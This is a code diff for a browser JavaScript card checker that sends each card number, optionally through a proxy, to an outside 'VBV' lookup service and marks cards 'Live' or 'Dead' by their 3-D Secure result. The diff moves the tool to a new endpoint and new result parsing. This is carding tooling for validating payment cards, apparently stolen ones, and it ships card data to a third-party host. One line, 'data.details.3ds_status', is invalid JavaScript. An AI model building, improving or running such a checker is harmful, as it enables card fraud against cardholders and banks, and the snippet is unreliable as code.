@@ -1,5 +1,5 @@
-const API_BASE_URL = 'vbv-red.vercel.app';
-const API_PATH = '/lookup';
+const API_BASE_URL = 'https://vbv.bbinl.eu.cc';
+const API_PATH = '/api/vbv4';
 
 const checkBtn = document.getElementById('check-btn');
 const stopCheckBtn = document.getElementById('stop-check-btn');
@@ -75,7 +75,7 @@ async function startChecking() {
 
         try {
             const proxy = "";
-            let url = `${API_BASE_URL}${API_PATH}?auth=${encodeURIComponent(card)}`;
+            let url = `${API_BASE_URL}${API_PATH}?cc=${encodeURIComponent(card)}`;
             if (proxy) url += `&proxy=${encodeURIComponent(proxy)}`;
 
             const response = await fetch(url);
@@ -85,12 +85,21 @@ async function startChecking() {
             const data = await response.json();
 
             let status = 'Unknown';
-            let message = data.message || data.error || 'Unknown error';
+            let message = '';
 
             if (data.status === 'success') {
-                status = 'Live';
-            } else if (data.status === 'declined') {
-                status = 'Dead';
+                const res = data.result;
+                const tds = (data.details && data.details.3ds_status) || 'unknown';
+                message = `${res} (${tds})`;
+                
+                if (res === 'VBV APPROVED' || res === 'CHALLENGE REQUIRED') {
+                    status = 'Live';
+                } else {
+                    status = 'Dead';
+                }
+            } else {
+                status = 'Error';
+                message = data.message || data.error || 'Unknown error';
             }
 
             if (status === 'Live') {
